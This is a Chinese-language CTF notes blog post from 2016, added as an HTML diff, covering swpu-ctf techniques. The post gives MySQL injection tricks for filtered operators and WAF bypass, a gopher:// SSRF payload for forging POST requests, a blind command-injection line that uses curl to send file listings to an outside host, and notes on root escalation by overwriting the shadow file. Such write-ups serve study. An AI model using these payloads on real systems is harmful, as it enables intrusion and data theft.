@@ -1,0 +1,110 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>2016 swpu-ctf小记</title>
+  <link rel="icon" href="/favicon.ico">
+  <link rel="stylesheet" href="/public/css/amazeui.min.css">
+  <link rel="stylesheet" href="/public/css/app.css">
+</head>
+<body>
+
+<div class="am-container lp-container">
+  <header class="am-topbar lp-topbar">
+    <h1 class="am-topbar-brand">
+      <a href="/">k1n9's Blog</a>
+    </h1>
+    <button class="am-topbar-btn am-topbar-toggle am-btn am-btn-sm am-btn-danger am-show-sm-only" data-am-collapse="{target: '#lp-topbar-collapse'}"><span class="am-sr-only">导航切换</span> <span class="am-icon-bars"></span></button>
+    <div class="am-collapse am-topbar-collapse am-topbar-right" id="lp-topbar-collapse">
+      <ul class="am-nav am-nav-pills am-topbar-nav">
+        <li><a href="/">Archives</a></li>
+<!--         <li><a href="#">Categories</a></li> -->
+        <li><a href="/friends.html">Friends</a></li>
+   <!--      <li><a href="#">About Me</a></li> -->
+        <li><a href="/rss.xml">Rss</a></li>
+      </ul>
+    </div>
+  </header>
+</div>
+
+
+<div class="am-container lp-container">
+  <div class="lp-post">
+    <div class="lp-post-header">
+      <h1 class="lp-post-title">2016 swpu-ctf小记</h1>
+      <div class="lp-post-meta">
+        <i class="am-icon-calculator"></i><span class="lp-post-date">2016-10-29</span>
+        <i class="am-icon-tags"></i><span class="lp-post-tags">ctf, mysql, ssrf</span>
+      </div>
+    </div>
+    <div class="lp-post-content">
+    <p>前几天有在做swpu-ctf，记录下这次有用上的一些姿势</p>
+
+<h2 id="mysql过滤逻辑运算符后如何拼接">MySQL过滤逻辑运算符后如何拼接</h2>
+<pre><code class="language-mysql">-
+select password from user where user='root'-1;	//无返回
+select password from user where user='root'-0;	//返回
++	//和-效果一样
+
+/
+select password from user where user='root'/1;	//返回
+select password from user where user='root'/0;	//无返回
+%	//和/效果一样
+</code></pre>
+<h2 id="mysql带入的一个特性">MySQL带入``的一个特性</h2>
+<p>平时在``放入字符，MySQL会去查找这个列，要是不存在这个列的话会出错。但绕过80sec的waf就需要带入`'`</p>
+<pre><code class="language-mysql">select password from user where user='root' and `test`.``.user or 1;
+//这里的`test`.``.user，test为任意内容，user要是当前查询表中存在的列名
+select password from user where user='root' and user or 1;	//跟上面的语句效果一样
+</code></pre>
+
+<h2 id="利用gopher在ssrf中发送post请求">利用gopher在ssrf中发送POST请求</h2>
+<pre><code class="language-urlencode">gopher://127.0.0.1:80/APOST%20/%20HTTP/1.1%0D%0AUser-Agent%3A%20curl/7.38.0%0D%0AHost%3A%20127.0.0.1%0D%0AAccept%3A%20%2A/%2A%0D%0AContent-Length%3A%2013%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0A%0D%0Apostdata%3Dtest
+</code></pre>
+<p>除了gopher有的/A就是一个正常http的POST包</p>
+
+<h2 id="无回显的命令执行">无回显的命令执行</h2>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl<span class="k">${</span><span class="nv">IFS</span><span class="k">}</span>http://ip/?a<span class="o">=</span><span class="sb">`</span><span class="nb">ls</span>|xargs|sed<span class="k">${</span><span class="nv">IFS</span><span class="k">}</span>s/[[:space:]]/:/g<span class="sb">`</span>
+</code></pre></div></div>
+<p>看log文件的记录就行，或者监听端口也行</p>
+
+<h2 id="其它">其它</h2>
+<p>那个tomcat的提权，看别人的writeup都是用的最近一个洞来提权的。我发现它那里tomcat用户是shadow文件的所有者，我就直接覆盖掉之前root的密码再切用户完成提权了，应该就跟用passwd命令来改密码一个效果。不会像用脏牛漏洞时覆盖passwd文件里的root那样导致系统好多的服务出问题，从而死机。后面脏牛的POC貌似是改写具有s权限的文件来提权的，不过试了本地两台虚拟机还是会死机- -</p>
+
+    </div>
+    
+    
+
+  </div>
+</div>
+
+<div class="am-container lp-container">
+  <footer class="am-footer lp-footer">
+    <p>Copyright © 2014-2015 All Rights Reserved</p>
+    <p>Theme By <a href="https://github.com/RickGray/light-post">LightPost</a></p>
+  </afooter>
+</div>
+
+
+<div data-am-widget="gotop" class="am-gotop am-gotop-fixed">
+  <a href="#top" title="回到顶部">
+    <span class="am-gotop-title">GoTop</span>
+    <i class="am-gotop-icon am-icon-chevron-up"></i>
+  </a>
+</div>
+
+<script src="/public/js/jquery.min.js"></script>
+<script src="/public/js/amazeui.min.js"></script>
+<script>
+var _hmt = _hmt || [];
+(function() {
+var hm = document.createElement("script");
+hm.src = "//hm.baidu.com/hm.js?cff98725226896ccfb3b1634435b315c";
+var s = document.getElementsByTagName("script")[0];
+s.parentNode.insertBefore(hm, s);
+})();
+</script>
+</div>
+</body>
+</html>
